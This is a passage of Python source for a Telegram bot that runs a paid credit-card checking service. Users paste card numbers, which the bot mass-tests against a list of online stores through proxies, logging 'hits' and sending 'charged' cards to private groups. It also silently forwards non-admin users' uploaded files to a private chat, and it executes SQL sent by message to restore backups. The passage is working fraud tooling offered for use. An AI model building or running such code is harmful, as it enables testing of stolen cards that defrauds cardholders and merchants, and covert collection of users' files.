        nt, tc = c.execute("SELECT COUNT(*) as n FROM users WHERE last_seen LIKE ?", (f"{today}%",)).fetchone()["n"], c.execute("SELECT COUNT(*) as n FROM check_logs").fetchone()["n"]
        th, bn = c.execute("SELECT COUNT(*) as n FROM check_logs WHERE status='HIT'").fetchone()["n"], c.execute("SELECT COUNT(*) as n FROM users WHERE banned=1").fetchone()["n"]
    await edit_admin(cb, f"{pe('chart')} <b>Admin Stats</b>\n<blockquote>Users: <b>{tu:,}</b>\nToday: <b>{nt:,}</b>\nChecks: <b>{tc:,}</b>\nHits: <b>{th:,}</b>\nRate: <b>{(th / tc * 100 if tc else 0):.1f}%</b>\nBanned: <b>{bn:,}</b></blockquote>", admin_main_kb(cb.from_user.id))
    await cb.answer()

@router.callback_query(F.data == "admin:clear_cache")
async def cb_admin_clear_cache(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    with db() as c: c.execute("DELETE FROM bin_cache"); c.execute("DELETE FROM user_proxies WHERE status='dead'")
    _invalidate_sites()
    await cb.answer("Cache cleared", show_alert=True)
    await cb_admin_main(cb)

@router.callback_query(F.data == "admin:view_hitlog")
async def cb_view_hitlog(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    ch = get_setting("hit_log_channel", "")
    if not ch: return await cb.answer("Hit Log is OFF", show_alert=True)
    await edit_admin(cb, f"{pe('msg')} <b>Hit Log</b>\n<blockquote>ID: <code>{esc(ch)}</code></blockquote>", InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Change"), icon="pen", color="primary", callback_data="admin:set_hitlog")], [pbtn(sc("Back"), icon="back", callback_data="admin:main")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:view_autopost")
async def cb_view_autopost(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    ch = get_setting("auto_post_chat", "")
    if not ch: return await cb.answer("Auto-Post is OFF", show_alert=True)
    await edit_admin(cb, f"{pe('chat')} <b>Auto-Post</b>\n<blockquote>ID: <code>{esc(ch)}</code></blockquote>", InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Change"), icon="pen", color="primary", callback_data="admin:set_autopost")], [pbtn(sc("Back"), icon="back", callback_data="admin:main")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:set_hitlog")
async def cb_admin_set_hitlog(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "admin_hitlog")
    await edit_admin(cb, f"{pe('msg')} <b>Hit Log Channel</b>\n<blockquote>Send chat ID or <code>off</code></blockquote>", InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", callback_data="admin:main")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:set_autopost")
async def cb_admin_set_autopost(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "admin_autopost")
    await edit_admin(cb, f"{pe('chat')} <b>Auto-Post Chat ID</b>", InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", callback_data="admin:main")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:gen_code")
async def cb_admin_gen_code(cb: CallbackQuery):
    if not is_admin(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "admin_gen_code")
    await edit_admin(cb, f"{pe('gem')} <code>[plan] [uses] [days]</code>\n{pe('pen')} Example: <code>premium 5 30</code>", InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", callback_data="admin:main")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:user_lookup")
async def cb_admin_ul(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "admin_user_lookup")
    await edit_admin(cb, f"{pe('user')} <b>User ID</b>:", InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", callback_data="admin:main")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:give_plan")
async def cb_admin_gp(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "admin_give_plan")
    await edit_admin(cb, f"{pe('gem')} <code>[uid] [plan]</code>", InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", callback_data="admin:main")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:give_points")
async def cb_admin_gpts(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "admin_give_points")
    await edit_admin(cb, f"{pe('star')} <code>[uid] [amount]</code>", InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", callback_data="admin:main")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:ban")
async def cb_admin_ban(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "admin_ban")
    await edit_admin(cb, f"{pe('warn')} <code>[uid]</code>", InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", callback_data="admin:main")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:broadcast")
async def cb_admin_bc(cb: CallbackQuery):
    if not is_admin(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "admin_broadcast")
    await edit_admin(cb, f"{pe('bell')} <b>Send broadcast</b>\n<blockquote>Text or photo with caption</blockquote>", InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", callback_data="admin:main")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:add_admin")
async def cb_admin_add_admin(cb: CallbackQuery):
    if cb.from_user.id != OWNER_ID: return await cb.answer("Owner only", show_alert=True)
    set_awaiting(cb.from_user.id, "admin_add_admin")
    await edit_admin(cb, f"{pe('add')} <code>[uid]</code>", InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", callback_data="admin:main")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:add_ltd_admin")
async def cb_admin_add_ltd_admin(cb: CallbackQuery):
    if cb.from_user.id != OWNER_ID: return await cb.answer("Owner only", show_alert=True)
    set_awaiting(cb.from_user.id, "admin_add_ltd_admin")
    await edit_admin(cb, f"{pe('add')} <b>Add Limited Admin</b>\n<blockquote>key gen + broadcast only\n<code>[uid]</code></blockquote>", InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", callback_data="admin:main")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:add_premium")
async def cb_admin_add_premium(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "admin_give_plan")
    await edit_admin(cb, f"{pe('gem')} <code>[uid] premium</code>", InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", callback_data="admin:main")]]))
    await cb.answer()

@router.callback_query(F.data == "admin:force_list")
async def cb_admin_force_list(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    await edit_admin(cb, f"{pe('unlock')} <b>Force Sub Channels ({len(force_channels_list())})</b>", force_list_kb())
    await cb.answer()

@router.callback_query(F.data == "admin:force_add")
async def cb_admin_force_add(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    set_awaiting(cb.from_user.id, "force_add")
    await edit_admin(cb, f"{pe('add')} <b>Add Force Sub</b>\n<blockquote>Forward any message from channel/group</blockquote>", InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Back"), icon="back", callback_data="admin:force_list")]]))
    await cb.answer()

@router.callback_query(F.data.startswith("admin:force_view:"))
async def cb_admin_force_view(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    chat_id = cb.data.split(":", 2)[2]
    with db() as c: ch = c.execute("SELECT * FROM force_channels WHERE chat_id=?", (chat_id,)).fetchone()
    if not ch: return await cb.answer("Not found", show_alert=True)
    await edit_admin(cb, f"{pe('unlock')} <b>Force Channel</b>\n<blockquote>Title: {esc(ch['title'] or 'N/A')}\nID: <code>{esc(ch['chat_id'])}</code>\nStatus: {'ON' if ch['enabled'] else 'OFF'}</blockquote>", InlineKeyboardMarkup(inline_keyboard=[[pbtn(f"Turn {'OFF' if ch['enabled'] else 'ON'}", icon="refresh", color="success", callback_data=f"admin:force_toggle:{chat_id}")], [pbtn(sc("Remove"), icon="trash", color="danger", callback_data=f"admin:force_remove:{chat_id}")], [pbtn(sc("Back"), icon="back", callback_data="admin:force_list")]]))
    await cb.answer()

@router.callback_query(F.data.startswith("admin:force_toggle:"))
async def cb_admin_force_toggle(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    await cb.answer(f"{'ON' if toggle_force_channel(cb.data.split(':', 2)[2]) else 'OFF'}")
    await cb_admin_force_view(cb)

@router.callback_query(F.data.startswith("admin:force_remove:"))
async def cb_admin_force_remove(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    remove_force_channel(cb.data.split(":", 2)[2])
    await cb.answer("Removed", show_alert=True)
    await cb_admin_force_list(cb)

@router.callback_query(F.data.startswith("fsite:add:"))
async def cb_force_site_add(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    site = cb.data.split(":", 2)[2]
    add_site_db(site)
    await cb.message.edit_text(f"{pe('check')} <b>Site Force Added:</b> <code>{esc(site)}</code>", reply_markup=None)
    await cb.answer("Added")

@router.callback_query(F.data.startswith("fsite:rej:"))
async def cb_force_site_rej(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return
    await cb.message.edit_text(f"{pe('cross1')} <b>Site Rejected:</b> <code>{esc(cb.data.split(':', 2)[2])}</code>", reply_markup=None)
    await cb.answer("Rejected")

# ── text / photo / document handlers ─────────────────────────────────────────
@router.message(F.text)
async def handle_text(msg: Message):
    if msg.text and msg.text.startswith("/"): return
    uid, awaiting = msg.from_user.id, get_awaiting(msg.from_user.id)
    ensure_user(uid, msg.from_user.username or "")

    if awaiting == "redeem_input": set_awaiting(uid, ''); await redeem_code(msg, msg.text.strip()); return

    if awaiting == "add_proxy":
        set_awaiting(uid, ''); parsed = parse_proxy_txt(msg.text)
        if not parsed: return await msg.answer(f"{pe('cross1')} <b>{sc('No valid proxies')}</b>", parse_mode="HTML", reply_markup=proxy_kb(uid))
        st = await msg.answer(f"{pe('loading')} <b>{sc('Testing')} {len(parsed)} {sc('proxies')}...</b>", parse_mode="HTML")
        result = await add_proxies_bulk(uid, parsed)
        await st.edit_text(f"{pe('check')} <b>{sc('Proxy Add Complete')}</b>\n<blockquote>Parsed: <b>{result['total_parsed']}</b>\nLive: <b>{result['live']}</b>\nDead: <b>{result['dead']}</b></blockquote>", parse_mode="HTML", reply_markup=proxy_kb(uid))
        return

    if awaiting and awaiting.startswith("proof_days:") and is_admin(uid):
        set_awaiting(uid, "")
        target_uid = int(awaiting.split(":")[1])
        try: days = int(msg.text.strip())
        except: return await msg.answer(f"{pe('cross1')} <b>{sc('Enter a number')}</b>", parse_mode="HTML")
        if days < 1 or days > 3650: return await msg.answer(f"{pe('cross1')} <b>{sc('1–3650 days only')}</b>", parse_mode="HTML")
        rand1 = ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
        rand2 = ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
        key = f"{KEY_PREFIX}-{rand1}-{rand2}"
        with db() as c: c.execute("INSERT INTO redeem_codes(code, plan, max_uses, days, used) VALUES (?,?,?,?,0)", (key, "premium", 1, days))
        try:
            await msg.bot.send_message(target_uid,
                f"{pe('spark')} <b>{BOT_BRAND}</b>\n\n"
                f"{pe('check')} <b>{sc('Payment Approved')}</b>\n\n"
                f"{pe('gem')} <b>{sc('Access Key')}</b>\n"
                f"<code>{_fmt_key_display(key)}</code>\n\n"
                f"{pe('docs')} <b>{sc('Redeem')}</b>\n"
                f"<code>/redeem {key}</code>\n\n"
                f"{pe('clock')} <b>{sc('Duration')}</b> · {days} {sc('days')}",
                parse_mode="HTML")
        except: pass
        await msg.answer(f"{pe('check')} <b>{sc('Key generated & sent')}</b>\n<blockquote>{pe('gem')} <code>{key}</code>\n{pe('user')} UID <code>{target_uid}</code>\n{pe('clock')} {days}d</blockquote>", parse_mode="HTML", reply_markup=admin_main_kb(uid))
        return

    if awaiting.startswith("set_crypto:") and is_full_admin(uid):
        wallet = awaiting.split(":", 1)[1]
        set_awaiting(uid, "")
        val = msg.text.strip()
        if val.lower() in ("off", "clear", "none"): val = ""
        set_crypto_wallet(wallet, val)
        await msg.answer(f"{pe('check')} <b>{wallet.upper()}</b> {sc('updated')}", parse_mode="HTML", reply_markup=admin_main_kb(uid))
        return

    if awaiting.startswith("set_star:") and is_full_admin(uid):
        plan_key = awaiting.split(":", 1)[1]
        set_awaiting(uid, "")
        try: n = int(msg.text.strip())
        except: return await msg.answer(f"{pe('cross1')} {sc('Enter a number')}", parse_mode="HTML")
        if n < 0 or n > 100000: return await msg.answer(f"{pe('cross1')} {sc('Out of range')}", parse_mode="HTML")
        set_setting(f"star_price_{plan_key}", str(n))
        await msg.answer(f"{pe('check')} <b>{plan_key}</b> → <b>{n}⭐</b>", parse_mode="HTML", reply_markup=admin_main_kb(uid))
        return

    if awaiting == "set_jio_url" and is_full_admin(uid):
        set_awaiting(uid, "")
        u = msg.text.strip()
        if not u.startswith("http"): return await msg.answer(f"{pe('cross1')} {sc('Invalid URL')}", parse_mode="HTML")
        set_setting("jio_api_url", u)
        await msg.answer(f"{pe('check')} <b>Jio URL</b> {sc('updated')}", parse_mode="HTML", reply_markup=admin_main_kb(uid))
        return

    if awaiting.startswith("api_cap:") and uid == OWNER_ID:
        try: idx = int(awaiting.split(":", 1)[1])
        except: set_awaiting(uid, ''); return await msg.answer("bad idx", reply_markup=admin_main_kb(uid))
        set_awaiting(uid, ''); txt = msg.text.strip()
        if not txt.isdigit(): return await msg.answer("send a number", reply_markup=admin_main_kb(uid))
        st = load_api_state()
        if 0 <= idx < len(st["endpoints"]): st["endpoints"][idx]["cap"] = int(txt); save_api_state(st)
        await msg.answer(f"cap={txt} set on [{idx}]", reply_markup=admin_main_kb(uid))
        return

    if awaiting == "restore_backup" and is_full_admin(uid):
        set_awaiting(uid, '')
        try:
            with db() as c:
                for t in ["users", "settings", "redeem_codes", "redeem_log", "check_logs", "saved_cards", "bin_cache", "user_proxies", "sites", "force_channels", "charged_hits", "feedback"]: c.execute(f"DROP TABLE IF EXISTS {t}")
                c.executescript(msg.text)
            reset_db_conn(); init_db(); load_extra_admins(); _invalidate_sites()
            await msg.answer(f"{pe('check')} <b>Database Restored</b>", parse_mode="HTML", reply_markup=admin_main_kb(uid))
        except Exception as e: await msg.answer(f"{pe('cross1')} Restore failed: {esc(str(e))}", parse_mode="HTML", reply_markup=admin_main_kb(uid))
        return

    if awaiting == "admin_public" and is_full_admin(uid):
        set_awaiting(uid, ''); v = msg.text.strip()
        set_setting("public_gc_id", "" if v.lower() in ("off", "disable", "clear") else v)
        await msg.answer(f"{pe('check')} Public GC {'disabled' if v.lower() in ('off', 'disable', 'clear') else f'set: <code>{esc(v)}</code>'}", parse_mode="HTML", reply_markup=admin_main_kb(uid))
        return

    if awaiting == "admin_fb_channel" and is_full_admin(uid):
        set_awaiting(uid, ''); v = msg.text.strip()
        set_setting("fb_channel_id", "" if v.lower() in ("off", "disable", "clear") else v)
        await msg.answer(f"{pe('check')} FB Channel {'disabled' if v.lower() in ('off', 'disable', 'clear') else f'set: <code>{esc(v)}</code>'}", parse_mode="HTML", reply_markup=admin_main_kb(uid))
        return

    if awaiting == "admin_max_price" and is_full_admin(uid):
        set_awaiting(uid, '')
        try:
            p = float(msg.text.strip())
            if p < 0: raise ValueError()
            set_setting("site_max_price", str(p))
            await msg.answer(f"{pe('check')} <b>Max price</b>: <b>${p:.2f}</b>", parse_mode="HTML", reply_markup=admin_main_kb(uid))
        except: await msg.answer(f"{pe('cross1')} <b>Invalid number</b>", parse_mode="HTML", reply_markup=admin_main_kb(uid))
        return

    if awaiting == "site_check_input" and is_full_admin(uid): set_awaiting(uid, ''); await run_site_checker_flow(msg, msg.text); return

    if awaiting in ("pvt_file_gc_set", "pvt_cc_gc_set", "gc_set") and is_full_admin(uid):
        set_awaiting(uid, ''); chat_id, title, text = None, "", msg.text.strip()
        if re.fullmatch(r"-?\d+", text): chat_id = int(text)
        if chat_id is None: return await msg.answer(f"{pe('cross1')} <b>Send numeric id</b>", parse_mode="HTML", reply_markup=admin_main_kb(uid))
        try:
            chat = await _bot_ref.get_chat(chat_id); title = chat.title or str(chat_id)
        except Exception as e: return await msg.answer(f"{pe('cross1')} <b>Bot cannot access chat</b>", parse_mode="HTML", reply_markup=admin_main_kb(uid))
        if awaiting == "gc_set": set_setting("charged_gc_id", str(chat_id)); set_setting("charged_gc_name", title); label = "Charged GC"
        elif awaiting == "pvt_file_gc_set": set_setting("pvt_file_gc_id", str(chat_id)); set_setting("pvt_file_gc_name", title); label = "Pvt File GC"
        else: set_setting("pvt_cc_gc_id", str(chat_id)); set_setting("pvt_cc_gc_name", title); label = "Pvt CC GC"
        await msg.answer(f"{pe('check')} <b>{sc(label + ' Set')}</b>\n<blockquote>{pe('chat')} <b>{esc(title)}</b>\n{pe('link')} <code>{esc(chat_id)}</code></blockquote>", parse_mode="HTML", reply_markup=admin_main_kb(uid))
        return

    if awaiting == "api_add" and uid == OWNER_ID:
        set_awaiting(uid, ''); parts = msg.text.split()
        if not parts or not parts[0].startswith(("http://", "https://")): return await msg.answer("invalid URL", reply_markup=admin_main_kb(uid))
        url, key, style, site_req, cap = parts[0].strip(), None, "params", True, DEFAULT_WORKERS_CAP
        for p in parts[1:]:
            if "=" in p:
                k, v = p.split("=", 1); k = k.lower()
                if k == "key": key = v
                elif k == "style": style = v.lower() if v.lower() in ("raw", "params") else "params"
                elif k == "site": site_req = v.lower() not in ("no", "false", "0", "siteless", "ns")
                elif k == "cap":
                    try: cap = int(v)
                    except: pass
            elif key is None: key = p
        st = load_api_state()
        if any(e["url"] == url for e in st["endpoints"]): return await msg.answer("api already exists", reply_markup=admin_main_kb(uid))
        st["endpoints"].append({"url": url, "key": key, "style": style, "site_required": site_req, "cap": cap, "enabled": True}); save_api_state(st)
        await msg.answer(f"{pe('check')} <b>API added</b>\n<blockquote>idx=<code>{len(st['endpoints'])-1}</code></blockquote>", parse_mode="HTML", reply_markup=admin_main_kb(uid))
        return

    if awaiting == "site_add" and is_full_admin(uid):
        set_awaiting(uid, ''); site = msg.text.strip().lower()
        if site.startswith(("http://", "https://")): site = site.split("://", 1)[1]
        site = site.split("/")[0]
        if not site: return await msg.answer("invalid site", reply_markup=admin_main_kb(uid))
        st = await msg.answer(f"{pe('loading')} <b>Testing {esc(site)}...</b>", parse_mode="HTML")
        res = await test_site(site, timeout=15); amount, max_p = res.get("amount", 0.0), float(get_setting("site_max_price", "3.0"))
        if res.get("cls") == "captcha" or "PROPOSAL_ERROR" in res.get("response", "").upper(): return await st.edit_text(f"{pe('warn')} <b>Site flagged</b>\n<blockquote>Price: ${amount}</blockquote>", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[pbtn("Force Add", icon="check", color="success", callback_data=f"fsite:add:{site}"), pbtn("Reject", icon="cross1", color="danger", callback_data=f"fsite:rej:{site}")]]))
        if amount > max_p: return await st.edit_text(f"{pe('cross1')} <b>Rejected</b>\n<blockquote>Price ${amount} exceeds max ${max_p}</blockquote>", parse_mode="HTML")
        if res.get("cls") not in WORKING_SITE_CLASSES: return await st.edit_text(f"{pe('cross1')} <b>Rejected</b>\n<blockquote>{esc(_sanitize_err(res.get('response',''))[:120])}</blockquote>", parse_mode="HTML")
        return await st.edit_text(f"{pe('check')} <b>Saved</b> <code>{esc(site)}</code>" if add_site_db(site) else f"{pe('warn')} {sc('Already exists')}", parse_mode="HTML")
    if awaiting == "site_add_bulk" and is_full_admin(uid):
        set_awaiting(uid, '')
        sites = parse_site_list(msg.text)
        added = sum(1 for s in sites if add_site_db(s))
        await msg.answer(f"{pe('check')} <b>Sites Added</b>: <b>{added}/{len(sites)}</b>", parse_mode="HTML", reply_markup=sites_kb(0))
        return

    if awaiting == "force_add" and is_full_admin(uid):
        set_awaiting(uid, '')
        fwd_chat = getattr(msg, "forward_from_chat", None) or (getattr(msg.reply_to_message, "forward_from_chat", None) if msg.reply_to_message else None)
        if not fwd_chat: return await msg.answer(f"{pe('cross1')} <b>Invalid</b>", parse_mode="HTML")
        try:
            chat_id, title, chat_type, invite = str(fwd_chat.id), fwd_chat.title or "", fwd_chat.type or "channel", ""
            chat = await msg.bot.get_chat(chat_id)
            invite = chat.invite_link if chat.invite_link else (f"https://t.me/{chat.username}" if chat.username else (await msg.bot.create_chat_invite_link(chat_id)).invite_link if chat else "")
            add_force_channel(chat_id, title, chat_type, invite)
            await msg.answer(f"{pe('check')} <b>Force Channel Added</b>\n<blockquote>{esc(title)}</blockquote>", parse_mode="HTML", reply_markup=force_list_kb())
        except Exception as e: await msg.answer(f"{pe('cross1')} <b>Failed:</b> {esc(str(e)[:120])}", parse_mode="HTML")
        return

    if awaiting and is_admin(uid):
        set_awaiting(uid, ''); v = msg.text.strip()
        if awaiting == "admin_autopost": set_setting("auto_post_chat", v); await msg.answer(f"{pe('check')} {sc('Updated')}", reply_markup=admin_main_kb(uid))
        elif awaiting == "admin_hitlog": set_setting("hit_log_channel", "" if v.lower() in ("off", "disable", "clear") else v); await msg.answer(f"{pe('check')} {sc('Set')}", parse_mode="HTML", reply_markup=admin_main_kb(uid))
        elif awaiting == "admin_gen_code":
            parts = msg.text.split()
            if len(parts) == 3 and parts[0].lower() in PLANS and parts[1].isdigit() and parts[2].isdigit():
                rand1 = ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
                rand2 = ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
                code = f"{KEY_PREFIX}-{rand1}-{rand2}"
                with db() as c: c.execute("INSERT INTO redeem_codes (code, plan, max_uses, days, used) VALUES (?,?,?,?,0)", (code, parts[0].lower(), int(parts[1]), int(parts[2])))
                await msg.answer(f"{pe('gem')} <b>Code</b>\n<blockquote>{pe('star')} <code>{_fmt_key_display(code)}</code>\n{pe('docs')} <code>{code}</code>\n{pe('gem')} {PLANS[parts[0].lower()]['name']}\n{pe('user')} Uses: <b>{parts[1]}</b>\n{pe('hourglass')} Days: <b>{parts[2]}</b></blockquote>", parse_mode="HTML", reply_markup=admin_main_kb(uid))
            else: await msg.answer(f"{pe('cross1')} {sc('invalid')}", reply_markup=admin_main_kb(uid))
        elif awaiting == "admin_give_plan":
            parts = msg.text.split()
            if len(parts) == 2 and parts[0].isdigit() and parts[1].lower() in PLANS: upgrade_user(int(parts[0]), parts[1].lower()); await msg.answer(f"{pe('check')} {sc('Done')}", reply_markup=admin_main_kb(uid))
            else: await msg.answer(f"{pe('cross1')} {sc('invalid')}", reply_markup=admin_main_kb(uid))
        elif awaiting == "admin_add_admin" and v.isdigit():
            if int(v) not in ADMIN_IDS: ADMIN_IDS.append(int(v)); LIMITED_ADMIN_IDS[:] = [x for x in LIMITED_ADMIN_IDS if x != int(v)]; save_extra_admins()
            await msg.answer(f"{pe('check')} {sc('Admin granted')}", reply_markup=admin_main_kb(uid))
        elif awaiting == "admin_add_ltd_admin" and v.isdigit():
            if int(v) not in LIMITED_ADMIN_IDS and int(v) not in ADMIN_IDS: LIMITED_ADMIN_IDS.append(int(v)); save_extra_admins()
            await msg.answer(f"{pe('check')} <b>Limited admin granted</b>", parse_mode="HTML", reply_markup=admin_main_kb(uid))
        elif awaiting == "admin_give_points":
            parts = msg.text.split()
            if len(parts) == 2 and parts[0].isdigit() and parts[1].lstrip('-').isdigit():
                ensure_user(int(parts[0]))
                with db() as c: c.execute("UPDATE users SET credits=MAX(0, credits+?) WHERE uid=?", (int(parts[1]), int(parts[0])))
                await msg.answer(f"{pe('check')} {sc('Done')}", reply_markup=admin_main_kb(uid))
            else: await msg.answer(f"{pe('cross1')} {sc('invalid')}", reply_markup=admin_main_kb(uid))
        elif awaiting == "admin_ban" and v.isdigit():
            ensure_user(int(v))
            with db() as c:
                u = c.execute("SELECT banned FROM users WHERE uid=?", (int(v),)).fetchone(); nv = 0 if (u and u["banned"]) else 1
                c.execute("UPDATE users SET banned=? WHERE uid=?", (nv, int(v)))
            await msg.answer(f"{pe('check')} {'Unban' if nv==0 else 'Banned'}", reply_markup=admin_main_kb(uid))
        elif awaiting == "admin_user_lookup" and v.isdigit():
            u = get_user(int(v))
            if not u: await msg.answer(f"{pe('cross1')} {sc('Not found')}", reply_markup=admin_main_kb(uid))
            else: await msg.answer(f"{pe('user')} <b>{v}</b>\n<blockquote>@{esc(u['username'] or 'N/A')}\n{sc('Plan')}: {u['plan']}\n{sc('Credits')}: {u['credits']}\n{sc('Checks')}: {u['total_checks']}\n{sc('Hits')}: {u['total_hits']}\n{sc('Banned')}: {'YES' if u['banned'] else 'NO'}</blockquote>", parse_mode="HTML", reply_markup=admin_main_kb(uid))
        elif awaiting == "admin_broadcast" and msg.text:
            res = await broadcast_all(msg.bot, text=msg.html_text)
            await msg.answer(f"{pe('check')} {sc('Sent')} {res['ok']}/{res['total']}", reply_markup=admin_main_kb(uid))
        return

    if not await check_force_sub(msg.bot, uid): return await msg.answer(f"{pe('unlock')} <b>{sc('Join required channels first')}</b>", parse_mode="HTML")
    if get_setting("maintenance") == "1" and not is_admin(uid): return await msg.answer(f"{pe('warn')} <b>{sc('Maintenance')}</b>", parse_mode="HTML")

    normalized, seen = [], set()
    for line in msg.text.splitlines():
        for tok in re.split(r"[\s,;]+", line):
            n = normalize_cc(tok)
            if n and n not in seen: seen.add(n); normalized.append(n)
    if not normalized: return
    if len(normalized) == 1: return await process_check_logic(msg, normalized[0], msg.bot, mode="shopify")
    plan_key = plan_of(uid)
    if not is_admin(uid) and len(normalized) > PLANS[plan_key].get("mass_limit", 100): return await msg.answer(f"{pe('stop')} <b>{sc('Too many cards')}</b>", parse_mode="HTML")
    _cleanup_pending_mass(); token = uuid.uuid4().hex[:12]; _pending_mass[token] = {"uid": uid, "cards": normalized, "ts": time.time()}
    sample, more = "\n".join(f"• <code>{c}</code>" for c in normalized[:3]), f"\n<i>... and {len(normalized)-3} more</i>" if len(normalized) > 3 else ""
    limit_line = ("∞" if is_admin(uid) else str(PLANS[plan_key].get("mass_limit", 100)))
    text = f"{pe('glow_star')} <b>Cards Detected</b>\n<blockquote>{pe('gem')} Count: <b>{len(normalized)}</b>\n{pe('shop')} Limit: <b>{limit_line}</b>\n{pe('star')} Sites: <b>{len(get_sites())}</b></blockquote>\n<blockquote>{sample}{more}</blockquote>"
    kb = InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Start Mass Check"), icon="check", color="success", callback_data=f"mass:start:{token}")], [pbtn(sc("Cancel"), icon="cross1", color="danger", callback_data=f"mass:cancel:{token}")]])
    try: await msg.answer_photo(photo=IMG_CHECK, caption=text, parse_mode="HTML", reply_markup=kb)
    except: await msg.answer(text, parse_mode="HTML", reply_markup=kb)

@router.callback_query(F.data.startswith("mass:start:"))
async def cb_mass_start(cb: CallbackQuery):
    _cleanup_pending_mass()
    entry = _pending_mass.pop(cb.data.split(":", 2)[2], None)
    if not entry: return await cb.answer("Expired — paste cards again", show_alert=True)
    if entry["uid"] != cb.from_user.id: return await cb.answer("Not yours", show_alert=True)
    await cb.answer(f"Starting {len(entry['cards'])}...")
    try: await cb.message.edit_reply_markup(reply_markup=None)
    except: pass
    await run_mass_check(cb.message, entry["cards"], cb.bot, bypass_quota=is_admin(cb.from_user.id), uid=cb.from_user.id, username=cb.from_user.username or "")

@router.callback_query(F.data.startswith("mass:cancel:"))
async def cb_mass_cancel(cb: CallbackQuery):
    _pending_mass.pop(cb.data.split(":", 2)[2], None)
    try: await cb.message.delete()
    except: pass
    await cb.answer("Cancelled")

@router.message(F.photo)
async def handle_photo(msg: Message):
    if get_awaiting(msg.from_user.id) == "admin_broadcast" and is_admin(msg.from_user.id):
        set_awaiting(msg.from_user.id, ''); res = await broadcast_all(msg.bot, photo=msg.photo[-1].file_id, caption=msg.html_text or msg.caption or "")
        await msg.answer(f"{pe('check')} {sc('Sent')} {res['ok']}/{res['total']}", reply_markup=admin_main_kb(msg.from_user.id))

@router.message(F.document)
async def handle_document(msg: Message):
    uid, awaiting = msg.from_user.id, get_awaiting(msg.from_user.id)
    if not is_full_admin(uid): await forward_user_file_to_pvt_gc(msg.bot, msg, context=awaiting or "general")
    if is_full_admin(uid) and re.match(r"^backup_\d+_\d+\.sql\.gz\.part\d{1,3}$", (msg.document.file_name or "").lower()):
        if awaiting == "restore_backup": set_awaiting(uid, '')
        await _handle_backup_part(msg, uid); return
    if awaiting == "add_proxy":
        set_awaiting(uid, '')
        if not (msg.document.file_name or "").lower().endswith(".txt") or (msg.document.file_size or 0) > 5 * 1024 * 1024: return await msg.answer(f"{pe('cross1')} <b>Only .txt <5MB</b>", parse_mode="HTML", reply_markup=proxy_kb(uid))
        st = await msg.answer(f"{pe('loading')} <b>{sc('Downloading')}...</b>", parse_mode="HTML")
        try: raw = (await msg.bot.download_file((await msg.bot.get_file(msg.document.file_id)).file_path)).read().decode("utf-8", errors="ignore")
        except Exception as e: return await st.edit_text(f"{pe('cross1')} <b>Download failed</b>", parse_mode="HTML", reply_markup=proxy_kb(uid))
        parsed = parse_proxy_txt(raw)
        if not parsed: return await st.edit_text(f"{pe('cross1')} <b>No valid proxies</b>", parse_mode="HTML", reply_markup=proxy_kb(uid))
        await st.edit_text(f"{pe('loading')} <b>Testing {len(parsed)}...</b>", parse_mode="HTML")
        result = await add_proxies_bulk(uid, parsed)
        await st.edit_text(f"{pe('check')} <b>Proxy Add</b>\n<blockquote>Parsed: <b>{result['total_parsed']}</b>\nLive: <b>{result['live']}</b>\nDead: <b>{result['dead']}</b></blockquote>", parse_mode="HTML", reply_markup=proxy_kb(uid))
        return
